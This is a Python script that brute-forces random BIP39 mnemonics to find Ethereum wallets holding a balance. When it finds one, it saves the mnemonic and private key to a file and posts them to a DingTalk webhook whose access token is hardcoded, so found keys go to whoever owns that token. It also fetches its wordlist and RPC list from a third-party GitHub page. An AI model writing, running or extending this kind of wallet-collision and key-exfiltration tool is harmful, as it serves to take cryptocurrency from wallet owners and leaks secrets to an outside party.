import random
import requests
import time
import os
import sys
from mnemonic import Mnemonic
from web3 import Web3
from eth_account import Account
from colorthon import Colors
from web3.exceptions import TransactionNotFound

# Enable HD wallet feature
Account.enable_unaudited_hdwallet_features()

# Clear terminal log
def clearNow():
    os.system("cls" if 'win' in sys.platform.lower() else "clear")

# Delayed printing output
def printer(text: str):
    for letter in text:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)

# Clear terminal
clearNow()

# Color settings
red = Colors.RED
green = Colors.GREEN
cyan = Colors.CYAN
yellow = Colors.YELLOW
reset = Colors.RESET

# Check if bip39.txt exists in the current directory
if os.path.exists("bip39.txt"):
    bip = True
else:
    bip = False

if not bip:
    # If bip39.txt doesn't exist, download it from the specified URL
    bip39_url = "https://raw.githubusercontent.com/qskg8/qskg8.github.io/refs/heads/main/bip39.txt"
    # Download bip39 file
    printer(f"{yellow}Downloading bip39 file...{reset}\n")
    try:
        reqBip = requests.get(bip39_url, timeout=10)
        reqBip.raise_for_status()
        content_bip = reqBip.content.decode("utf-8")
        # Write content to local bip39.txt
        with open("bip39.txt", "w", encoding="utf-8") as filebip:
            filebip.write(content_bip)
        printer(f"{green}Successfully downloaded bip39 file.{reset}\n\n")
    except Exception as e:
        printer(f"{red}Failed to download bip39 file: {e}{reset}\n")
        sys.exit(1)

clearNow()

# Ensure 88.txt file exists, create if not
if not os.path.exists("88.txt"):
    try:
        with open("88.txt", "w", encoding="utf-8") as dr:
            # You can write initial content when creating the file, or leave it empty
            dr.write("")  # Create an empty file
        print(f"{green}Successfully created 88.txt file.{reset}")
    except Exception as e:
        print(f"{red}Failed to create 88.txt file: {e}{reset}")

# Fetch available RPC nodes from rpc.txt
def get_working_rpc():
    # Check if rpc.txt exists locally
    if not os.path.exists("rpc.txt"):
        # If rpc.txt doesn't exist, download it from the specified URL
        rpc_url = "https://raw.githubusercontent.com/qskg8/qskg8.github.io/refs/heads/main/rpc.txt"
        printer(f"{yellow}Downloading rpc.txt file...{reset}\n")
        try:
            reqRpc = requests.get(rpc_url, timeout=10)
            reqRpc.raise_for_status()
            content_rpc = reqRpc.content.decode("utf-8")
            # Write content to local rpc.txt
            with open("rpc.txt", "w", encoding="utf-8") as filercp:
                filercp.write(content_rpc)
            printer(f"{green}Successfully downloaded rpc.txt file.{reset}\n\n")
        except Exception as e:
            printer(f"{red}Failed to download rpc.txt file: {e}{reset}\n")
            sys.exit(1)

    # Read the content of rpc.txt file
    with open("rpc.txt", "r", encoding="utf-8") as file:
        rpc_urls = [url.strip() for url in file.readlines() if url.strip()]
    
    random.shuffle(rpc_urls)  # Shuffle the order
    
    for rpc_url in rpc_urls:
        try:
            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 5}))
            if web3.is_connected():
                return rpc_url
        except:
            continue
    
    raise Exception("No available RPC nodes")

# Check Ethereum balance using RPC node
def CheckBalanceEthereum(address: str):
    rpc_url = get_working_rpc()
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    
    try:
        balance = web3.eth.get_balance(address)
        return balance
    except TransactionNotFound:
        return 0
    except Exception as e:
        print(f"{red}Error checking balance: {e}{reset}")
        return None

# Generate Ethereum address and private key from mnemonic
def generate_eth_address_from_mnemonic(mnemonic):
    # Using standard BIP44 path
    account_path = "m/44'/60'/0'/0/0"
    
    # Verify mnemonic
    mnemo = Mnemonic("english")
    if not mnemo.check(mnemonic):
        raise ValueError(f"Invalid mnemonic: {mnemonic}")
    
    # Generate account
    acct = Account.from_mnemonic(mnemonic, account_path=account_path)
    private_key = acct.key
    eth_address = acct.address
    return eth_address, private_key

# Counter
z = 0
ff = 0

# Read bip39.txt content
try:
    with open("bip39.txt", "r", encoding="utf-8") as b_read:
        bip39 = [line.strip() for line in b_read.readlines() if line.strip()]
except Exception as e:
    print(f"{red}Failed to read bip39.txt file: {e}{reset}")
    sys.exit(1)

# DingTalk robot webhook URL (recommended to get it from environment variables)
dingding_url = "https://oapi.dingtalk.com/robot/send?access_token=e40d2c94bb41f0b403d44fecb3e68f33af4c6dbff053e4aaaa09c2adaa43d219"

# Send notification to DingTalk
def send_dingding_notification(address, mnemonic, private_key, balance):
    content = f"""🚨 Mnemonic collision ETH address with balance greater than 0 🚨
Address: {address}
Mnemonic: {mnemonic}
Private Key: {private_key.hex()}
Balance: {balance} ETH"""
    
    headers = {"Content-Type": "application/json"}
    data = {"msgtype": "text", "text": {"content": content}}

    try:
        response = requests.post(dingding_url, json=data, headers=headers, timeout=10)
        response.raise_for_status()
        print(f"{green}Successfully sent DingTalk notification!{reset}")
    except Exception as e:
        print(f"{red}Failed to send DingTalk notification: {e}{reset}")

# Main loop
while True:
    z += 1
    
    # Generate a mnemonic with valid BIP39 word count
    rand_num = random.choice([12, 15, 18, 21, 24])
    mnemonic = " ".join(random.choice(bip39) for _ in range(rand_num))
    
    try:
        eth_addr, private_key = generate_eth_address_from_mnemonic(mnemonic)
        eth_bal = CheckBalanceEthereum(eth_addr)
        
        if eth_bal is None:
            continue
            
        eth_balance = eth_bal / 10**18
        
        if eth_balance > 0:
            ff += 1
            with open("88.txt", "a", encoding="utf-8") as dr:
                dr.write(f"ETH: {eth_addr} | Balance: {eth_balance}\n"
                         f"Mnemonic: {mnemonic}\n"
                         f"Private Key: {private_key.hex()}\n\n")
            
            send_dingding_notification(eth_addr, mnemonic, private_key, eth_balance)
        
        # Optimized output format
        addr_space = " " * (44 - len(eth_addr))
        print(f"({z}) ETH: {cyan}{eth_addr}{reset}{addr_space}[Balance: {cyan}{eth_balance}{reset}]")
        print(f"Mnemonic: {yellow}{mnemonic}{reset}")
        print(f"Private Key: {private_key.hex()}")
        print(f"{'-' * 66}")
    
    except ValueError:
        continue  # Skip invalid mnemonic
    except KeyboardInterrupt:
        print(f"\n{red}Program interrupted by user{reset}")
        break
    except Exception as e:
        print(f"{red}An unknown error occurred: {e}{reset}")
        continue
